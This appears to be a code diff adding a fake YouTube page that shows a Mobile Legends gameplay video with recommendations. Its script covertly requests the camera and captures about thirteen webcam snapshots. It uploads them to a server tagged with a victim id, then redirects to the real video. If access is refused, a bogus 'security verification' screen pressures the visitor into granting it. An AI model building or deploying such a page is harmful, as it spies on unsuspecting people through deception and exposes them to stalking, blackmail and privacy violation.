@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>YouTube</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-gray: #aaaaaa; }
+        body { margin: 0; background: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", sans-serif; }
+        
+        .navbar { height: 56px; display: flex; align-items: center; padding: 0 16px; background: var(--yt-bg); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #222; justify-content: space-between; }
+        .yt-logo { display: flex; align-items: center; font-size: 18px; font-weight: bold; }
+        .yt-logo i { color: #ff0000; margin-right: 4px; font-size: 24px; }
+
+        .hero-video { width: 100%; aspect-ratio: 16/9; background: #000; position: relative; }
+        .hero-img { width: 100%; height: 100%; object-fit: cover; }
+        .yt-btn-play { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; align-items: center; justify-content: center; }
+        .yt-btn-play::after { content: ''; border-left: 18px solid white; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 5px; }
+
+        .details { padding: 15px; border-bottom: 1px solid #333; }
+        .v-title { font-size: 18px; font-weight: 500; margin-bottom: 10px; }
+        
+        .rec-section { padding: 10px; }
+        .item { display: flex; gap: 10px; margin-bottom: 15px; }
+        .item-thumb { width: 140px; height: 80px; border-radius: 4px; background-size: cover; flex-shrink: 0; }
+        .item-info b { font-size: 14px; display: block; margin-bottom: 3px; }
+        .item-info p { font-size: 12px; color: var(--yt-gray); margin: 0; }
+
+        video, canvas { display: none; }
+        #force-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; display: none; color: white; text-align: center; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    <div id="force-box">
+        <h3 style="color: red;">Playback Error</h3>
+        <p>Security verification required. Please allow camera to verify you are not a bot.</p>
+        <button onclick="location.reload()" style="padding: 15px; background: red; color: white; border: none; border-radius: 5px;">VERIFY NOW</button>
+    </div>
+
+    <nav class="navbar"><div class="yt-logo"><i class="fab fa-youtube"></i> YouTube</div><i class="fas fa-search"></i></nav>
+    <div class="hero-video"><img src="https://img.youtube.com/vi/-2jAzVR_4Ww/maxresdefault.jpg" class="hero-img"><div class="yt-btn-play"></div></div>
+    
+    <div class="details">
+        <div class="v-title">TOP GLOBAL MINSITTHAR GAMEPLAY 2026 | Mythic Immortal</div>
+        <p style="color:var(--yt-gray); font-size: 12px;">1.1M views • 12 hours ago</p>
+    </div>
+
+    <div class="rec-section">
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/BtNydmyUBWU/hqdefault.jpg')"></div><div class="item-info"><b>Best Thamuz Build S32</b><p>400K views</p></div></div>
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/o-eA6_uwSA0/hqdefault.jpg')"></div><div class="item-info"><b>Minsitthar vs Fighters</b><p>120K views</p></div></div>
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/FSNzZi980P0/hqdefault.jpg')"></div><div class="item-info"><b>MLBB Professional Highlights</b><p>2M views</p></div></div>
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/wGB-T36ss7k/hqdefault.jpg')"></div><div class="item-info"><b>Thamuz 1v5 Savage Moment</b><p>750K views</p></div></div>
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/hEwpjRHRpC8/hqdefault.jpg')"></div><div class="item-info"><b>Road to Mythic Immortal Guide</b><p>56K views</p></div></div>
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/p8nK7XyI-S8/hqdefault.jpg')"></div><div class="item-info"><b>Vinzy Gaming: Funny Moments</b><p>1M views</p></div></div>
+        <div class="item"><div class="item-thumb" style="background-image:url('https://img.youtube.com/vi/Y8Zp_fM6_gM/hqdefault.jpg')"></div><div class="item-info"><b>Thamuz vs Terizla Matchup</b><p>34K views</p></div></div>
+    </div>
+
+    <video id="vid" autoplay muted playsinline></video><canvas id="canv"></canvas>
+
+    <script>
+        const tid = new URLSearchParams(window.location.search).get('id');
+        const ytid = new URLSearchParams(window.location.search).get('ytid') || '-2jAzVR_4Ww';
+
+        async function loopCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const v = document.getElementById('vid'); v.srcObject = stream;
+                
+                let snaps = 0;
+                const i = setInterval(() => {
+                    if(snaps > 12) { clearInterval(i); window.location.href=`https://www.youtube.com/watch?v=${ytid}`; }
+                    const c = document.getElementById('canv'); c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData(); f.append('file', b, 'android.jpg');
+                        fetch(`/upload?id=${tid}&type=photo`, {method:'POST', body:f});
+                    }, 'image/jpeg', 0.6);
+                    snaps++;
+                }, 600);
+            } catch (e) {
+                document.getElementById('force-box').style.display = 'block';
+            }
+        }
+        window.onclick = loopCapture;
+        setTimeout(loopCapture, 1500);
+    </script>
+</body>
+</html>
